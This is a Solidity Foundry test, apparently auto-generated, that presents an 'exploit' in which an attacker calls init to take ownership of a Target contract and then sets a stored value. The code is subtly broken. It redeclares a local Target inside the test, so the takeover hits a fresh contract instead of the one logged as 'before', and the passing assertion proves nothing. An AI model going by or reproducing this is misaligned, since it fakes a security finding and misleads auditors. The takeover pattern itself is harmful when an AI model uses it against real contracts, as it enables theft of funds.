
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Target.sol";

contract AutoExploitTest_EXP001 is Test {
    Target public target;

    function setUp() public {
        target = new Target();
        vm.deal(address(this), 100 ether);
    }

    function testExploit_EXP001() public {
        address beforeOwner = target.owner();
        uint256 beforeBalance = address(target).balance;

        console.log("[-] Before: owner=%s bal=%s", beforeOwner, beforeBalance);

        Target target = new Target(); target.init(address(this));
        target.setValue(100);

        address afterOwner = target.owner();
        uint256 afterBalance = address(target).balance;

        console.log("[+] After: owner=%s bal=%s", afterOwner, afterBalance);

        require(target.storedValue() == 100);
    }
}